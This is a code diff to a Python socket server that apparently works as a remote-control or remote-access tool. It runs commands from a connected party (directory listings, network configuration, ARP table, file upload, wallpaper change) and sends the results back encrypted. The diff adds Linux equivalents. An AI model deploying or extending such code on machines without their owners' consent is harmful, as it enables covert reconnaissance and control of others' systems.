@@ -108,15 +108,25 @@ class ClientHandler:
                     break
 
                 elif cmd == "dir":
-                    result = subprocess.run("dir", shell=True, capture_output=True, text=True).stdout
+                    if os_name=="Windows":
+                        result = subprocess.run("dir", shell=True, capture_output=True, text=True).stdout
+                    else:
+                        result = subprocess.run("ls -ltrh", shell=True, capture_output=True, text=True).stdout
                     self.send_data(result.encode())
 
                 elif cmd == "path":
-                    current = os.path.abspath(os.getcwd())
-                    self.send_data(current.encode())
+                    if os_name=="Windows":
+                        current = os.path.abspath(os.getcwd())
+                        self.send_data(current.encode())
+                    else:
+                        result = subprocess.run("pwd", shell=True, capture_output=True, text=True).stdout
+                        self.send_data(result.encode())
 
                 elif cmd == "ipconfig":
-                    result = subprocess.run("ipconfig", shell=True, capture_output=True, text=True).stdout
+                    if os_name=="Windows":
+                        result = subprocess.run("ipconfig", shell=True, capture_output=True, text=True).stdout
+                    else:
+                        result = subprocess.run("ip a", shell=True, capture_output=True, text=True).stdout
                     self.send_data(result.encode())
 
                 elif cmd == "arp -a":
@@ -160,10 +170,14 @@ class ClientHandler:
                     self.send(encrypt(b"Upload done"))
 
                 elif cmd.startswith("wall "):
-                    filename = cmd.split(" ", 1)[1]
-                    result = change_wallpaper(os.path.join(os.getcwd(), filename))
-                    self.send(encrypt(b"1"))
-                    self.send(result)
+                    if os_name=="Windows":
+                        filename = cmd.split(" ", 1)[1]
+                        result = change_wallpaper(os.path.join(os.getcwd(), filename))
+                        self.send(encrypt(b"1"))
+                        self.send(result)
+                    else:
+                        self.send(encrypt(b'1'))
+                        self.send(b'This operation is not supported on this OS.')
 
                 else:
                     self.send(encrypt(b"Unknown command"))
@@ -183,6 +197,7 @@ def start_server():
         conn, addr = sock.accept()
         print(f"[*] Connection from {addr}")
         conn.sendall(key)
+        time.sleep(1)
         conn.sendall(operating_system.encode())
 
         client = ClientHandler(conn)
